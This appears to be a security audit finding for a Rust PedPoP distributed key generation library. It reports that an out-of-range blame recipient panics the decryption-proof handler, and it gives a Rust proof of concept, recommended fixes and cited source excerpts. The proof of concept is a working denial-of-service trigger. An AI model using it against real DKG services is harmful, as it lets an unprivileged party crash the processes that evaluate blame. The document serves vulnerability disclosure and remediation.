### Title

Out-of-range blame recipient causes a panic during PedPoP decryption proof handling - ([File: crypto/dkg/pedpop/src/encryption.rs](crypto/dkg/pedpop/src/encryption.rs))

### Summary

`BlameMachine::blame` and `AdditionalBlameMachine::blame` accept the accused sender, accusing recipient, encrypted share, and optional decryption proof as public inputs. `Decryption::decrypt_with_proof` indexes `enc_keys` with the supplied `decryptor` before checking whether that participant exists or whether the supplied proof is valid. A validly formatted `EncryptedMessage` and any syntactically valid `EncryptionKeyProof`, combined with a recipient outside the DKG's `1..=n` range, therefore panic the caller instead of returning `DecryptionError::InvalidProof`. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description

`Decryption::register` only inserts encryption keys for participants processed during commitment registration, so `enc_keys` contains entries for the DKG's configured participant indexes. [4](#0-3)  The public blame APIs do not validate that `sender` and `recipient` are members of that set before calling `blame_internal`. [5](#0-4)  When `proof` is `Some`, `decrypt_with_proof` evaluates `self.enc_keys[&decryptor]` while constructing the DLEq verification inputs; indexing a missing key panics before `DLEqProof::verify` can reject the proof. [6](#0-5) 

The PoP check does not prevent the malformed accusation because it binds the encrypted message to `from`, but not to `decryptor`. [7](#0-6)  Consequently, an encrypted share legitimately produced by `sender` remains valid under `msg.pop.verify` even when the caller supplies an out-of-range `recipient`. [8](#0-7) 

### Impact Explanation

An unprivileged party able to submit a blame statement can terminate the task or process evaluating it, matching the availability-impact class of CVE-2019-2482. [6](#0-5)  The crash occurs before the provided proof is cryptographically evaluated, so the attacker does not need a valid ECDH proof, a valid DLEq proof, or knowledge of a decryption key. [3](#0-2)  Repeated requests can repeatedly abort blame evaluation or the surrounding service handling those accusations. [1](#0-0) 

### Likelihood Explanation

The required `EncryptedMessage` is a normal protocol message with a valid sender-bound PoP, while `recipient` is selected by the caller rather than authenticated inside the ciphertext or PoP challenge. [9](#0-8) [7](#0-6)  Only `Some(proof)` is required to reach the vulnerable indexing, and `EncryptionKeyProof::read` accepts a syntactically valid key and DLEq pair without performing proof verification during deserialization. [10](#0-9) [11](#0-10)  Participant indexes outside `1..=n` are representable because `Participant::new` only rejects zero. [12](#0-11) 

### Recommendation

Validate both `sender` and `recipient` against the registered participant set before evaluating the PoP or constructing DLEq verification inputs, and return a structured invalid-participant/blame error. [5](#0-4)  Replace `self.enc_keys[&decryptor]` with `self.enc_keys.get(&decryptor).ok_or(DecryptionError::InvalidProof)?` or a dedicated invalid-participant error. [6](#0-5)  Add a regression test invoking `blame` with `recipient = Participant::new(n + 1)` and `Some` syntactically valid proof, asserting that no panic occurs. [13](#0-12) 

### Proof of Concept

```rust
use std::collections::HashMap;

use pedpop::*;
use dalek_ff_group::{Ristretto, Scalar};
use frost::Participant;
use rand_core::OsRng;

// Complete a normal two-party PedPoP session up to the point where party 1 has
// a BlameMachine and an authenticated encrypted share from party 2.
let context = [7; 32];
let params1 = ThresholdParams::new(
  2,
  2,
  Participant::new(1).unwrap(),
).unwrap();
let params2 = ThresholdParams::new(
  2,
  2,
  Participant::new(2).unwrap(),
).unwrap();

let (machine1, commitments1) =
  KeyGenMachine::<Ristretto>::new(params1, context)
    .generate_coefficients(&mut OsRng);
let (machine2, commitments2) =
  KeyGenMachine::<Ristretto>::new(params2, context)
    .generate_coefficients(&mut OsRng);

let mut to_machine1 = HashMap::new();
to_machine1.insert(Participant::new(2).unwrap(), commitments2);
let (key_machine1, _shares_from_1) =
  machine1.generate_secret_shares(&mut OsRng, to_machine1).unwrap();

let mut to_machine2 = HashMap::new();
to_machine2.insert(Participant::new(1).unwrap(), commitments1);
let (key_machine2, shares_from_2) =
  machine2.generate_secret_shares(&mut OsRng, to_machine2).unwrap();

// This is the normal encrypted share from participant 2 to participant 1.
let encrypted_share = shares_from_2[&Participant::new(1).unwrap()].clone();
let mut received = HashMap::new();
received.insert(Participant::new(2).unwrap(), encrypted_share.clone());
let blame_machine = key_machine1.calculate_share(&mut OsRng, received).unwrap();

// A syntactically valid EncryptionKeyProof for Ristretto:
// identity key, challenge = 0, response = 0. Its cryptographic validity is
// irrelevant because the panic happens before DLEq verification.
let proof_bytes = [0u8; 96];
let proof =
  EncryptionKeyProof::<Ristretto>::read(&mut proof_bytes.as_slice()).unwrap();

// Participant 3 is outside n = 2 but is still a valid non-zero Participant.
// The PoP on encrypted_share is bound to sender 2 and the ciphertext, not to
// the recipient argument, so execution reaches enc_keys[&3] and panics.
let (_additional, _faulty) = blame_machine.blame(
  Participant::new(2).unwrap(),
  Participant::new(3).unwrap(),
  encrypted_share,
  Some(proof),
);
```

`Decryption::decrypt_with_proof` panics at `self.enc_keys[&decryptor]` before returning `InvalidProof`. [6](#0-5)

### Citations

**File:** crypto/dkg/pedpop/src/lib.rs (L575-582)
```rust
  fn blame_internal(
    &self,
    sender: Participant,
    recipient: Participant,
    msg: EncryptedMessage<C, SecretShare<C::F>>,
    proof: Option<EncryptionKeyProof<C>>,
  ) -> Participant {
    let share_bytes = match self.encryption.decrypt_with_proof(sender, recipient, msg, proof) {
```

**File:** crypto/dkg/pedpop/src/lib.rs (L623-631)
```rust
  pub fn blame(
    self,
    sender: Participant,
    recipient: Participant,
    msg: EncryptedMessage<C, SecretShare<C::F>>,
    proof: Option<EncryptionKeyProof<C>>,
  ) -> (AdditionalBlameMachine<C>, Participant) {
    let faulty = self.blame_internal(sender, recipient, msg, proof);
    (AdditionalBlameMachine(self), faulty)
```

**File:** crypto/dkg/pedpop/src/lib.rs (L674-682)
```rust
  pub fn blame(
    &self,
    sender: Participant,
    recipient: Participant,
    msg: EncryptedMessage<C, SecretShare<C::F>>,
    proof: Option<EncryptionKeyProof<C>>,
  ) -> Participant {
    self.0.blame_internal(sender, recipient, msg, proof)
  }
```

**File:** crypto/dkg/pedpop/src/encryption.rs (L170-177)
```rust
impl<C: Ciphersuite, E: Encryptable> EncryptedMessage<C, E> {
  pub fn read<R: io::Read>(reader: &mut R, params: ThresholdParams) -> io::Result<Self> {
    Ok(Self {
      key: C::read_G(reader)?,
      pop: SchnorrSignature::<C>::read(reader)?,
      msg: Zeroizing::new(E::read(reader, params)?),
    })
  }
```

**File:** crypto/dkg/pedpop/src/encryption.rs (L266-269)
```rust
impl<C: Ciphersuite> EncryptionKeyProof<C> {
  pub fn read<R: io::Read>(reader: &mut R) -> io::Result<Self> {
    Ok(Self { key: Zeroizing::new(C::read_G(reader)?), dleq: DLEqProof::read(reader)? })
  }
```

**File:** crypto/dkg/pedpop/src/encryption.rs (L302-324)
```rust
fn pop_challenge<C: Ciphersuite>(
  context: [u8; 32],
  nonce: C::G,
  key: C::G,
  sender: Participant,
  msg: &[u8],
) -> C::F {
  let mut transcript = RecommendedTranscript::new(b"DKG Encryption Key Proof of Possession v0.2");
  transcript.append_message(b"context", context);

  transcript.domain_separate(b"proof_of_possession");

  transcript.append_message(b"nonce", nonce.to_bytes());
  transcript.append_message(b"key", key.to_bytes());
  // This is sufficient to prevent the attack this is meant to stop
  transcript.append_message(b"sender", sender.to_bytes());
  // This, as written above, doesn't hurt
  transcript.append_message(b"message", msg);
  // While this is a PoK and a PoP, it's called a PoP here since the important part is its owner
  // Elsewhere, where we use the term PoK, the important part is that it isn't some inverse, with
  // an unknown to anyone discrete log, breaking the system
  C::hash_to_F(b"DKG-encryption-proof_of_possession", &transcript.challenge(b"schnorr"))
}
```

**File:** crypto/dkg/pedpop/src/encryption.rs (L341-361)
```rust
#[derive(Clone, Debug)]
pub(crate) struct Decryption<C: Ciphersuite> {
  context: [u8; 32],
  enc_keys: HashMap<Participant, C::G>,
}

impl<C: Ciphersuite> Decryption<C> {
  pub(crate) fn new(context: [u8; 32]) -> Self {
    Self { context, enc_keys: HashMap::new() }
  }
  pub(crate) fn register<M: Message>(
    &mut self,
    participant: Participant,
    msg: EncryptionKeyMessage<C, M>,
  ) -> M {
    assert!(
      !self.enc_keys.contains_key(&participant),
      "Re-registering encryption key for a participant"
    );
    self.enc_keys.insert(participant, msg.enc_key);
    msg.msg
```

**File:** crypto/dkg/pedpop/src/encryption.rs (L374-379)
```rust
    if !msg.pop.verify(
      msg.key,
      pop_challenge::<C>(self.context, msg.pop.R, msg.key, from, msg.msg.deref().as_ref()),
    ) {
      Err(DecryptionError::InvalidSignature)?;
    }
```

**File:** crypto/dkg/pedpop/src/encryption.rs (L381-396)
```rust
    if let Some(proof) = proof {
      // Verify this is the decryption key for this message
      proof
        .dleq
        .verify(
          &mut encryption_key_transcript(self.context),
          &[C::generator(), msg.key],
          &[self.enc_keys[&decryptor], *proof.key],
        )
        .map_err(|_| DecryptionError::InvalidProof)?;

      cipher::<C>(self.context, &proof.key).apply_keystream(msg.msg.as_mut().as_mut());
      Ok(msg.msg)
    } else {
      Err(DecryptionError::InvalidProof)
    }
```

**File:** crypto/dleq/src/lib.rs (L189-193)
```rust
  /// Read a DLEq proof from something implementing Read.
  #[cfg(feature = "serialize")]
  pub fn read<R: Read>(r: &mut R) -> io::Result<DLEqProof<G>> {
    Ok(DLEqProof { c: read_scalar(r)?, s: read_scalar(r)? })
  }
```

**File:** crypto/dkg/src/lib.rs (L23-35)
```rust
/// The ID of a participant, defined as a non-zero u16.
#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Debug, Zeroize)]
#[cfg_attr(feature = "borsh", derive(borsh::BorshSerialize))]
pub struct Participant(u16);
impl Participant {
  /// Create a new Participant identifier from a u16.
  pub const fn new(i: u16) -> Option<Participant> {
    if i == 0 {
      None
    } else {
      Some(Participant(i))
    }
  }
```
